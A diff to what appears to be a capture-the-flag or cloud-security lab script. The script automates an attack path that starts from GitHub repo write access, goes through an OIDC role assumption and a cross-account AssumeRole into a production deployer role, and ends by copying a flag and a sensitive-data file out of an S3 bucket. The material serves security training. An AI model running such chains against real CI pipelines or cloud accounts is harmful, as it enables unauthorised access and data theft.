@@ -311,7 +311,8 @@ jobs:
           export AWS_SECRET_ACCESS_KEY=\$(echo \$CREDS | jq -r .Credentials.SecretAccessKey)
           export AWS_SESSION_TOKEN=\$(echo \$CREDS | jq -r .Credentials.SessionToken)
           aws sts get-caller-identity
-          aws s3 cp s3://${FLAG_BUCKET_NAME}/sensitive-data.txt /tmp/flag.txt
+          aws s3 cp s3://${FLAG_BUCKET_NAME}/sensitive-data.txt /tmp/sensitive-data.txt
+          aws s3 cp s3://${FLAG_BUCKET_NAME}/flag.txt /tmp/flag.txt
 
       - name: Display flag
         run: |
@@ -397,7 +398,7 @@ restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}============================================================${NC}"
-echo -e "${GREEN}ATTACK COMPLETE${NC}"
+echo -e "${GREEN}ATTACK COMPLETE — FLAG CAPTURED${NC}"
 echo -e "${GREEN}============================================================${NC}"
 echo -e "\n${YELLOW}Attack Path Executed:${NC}"
 echo "  GitHub repo write access ($GITHUB_REPO)"
@@ -405,7 +406,7 @@ echo "    → [sts:AssumeRoleWithWebIdentity via OIDC]"
 echo "    → ops:$OPS_DEPLOYER_ROLE  (account $OPS_ACCOUNT_ID)"
 echo "    → [sts:AssumeRole cross-account]"
 echo "    → prod:$PROD_DEPLOYER_ROLE  (account $PROD_ACCOUNT_ID)"
-echo "    → s3:GetObject on $FLAG_BUCKET_NAME"
+echo "    → s3:GetObject on s3://$FLAG_BUCKET_NAME/flag.txt"
 
 echo -e "\n${YELLOW}Key Commands:${NC}"
 for cmd in "${ATTACK_COMMANDS[@]}"; do
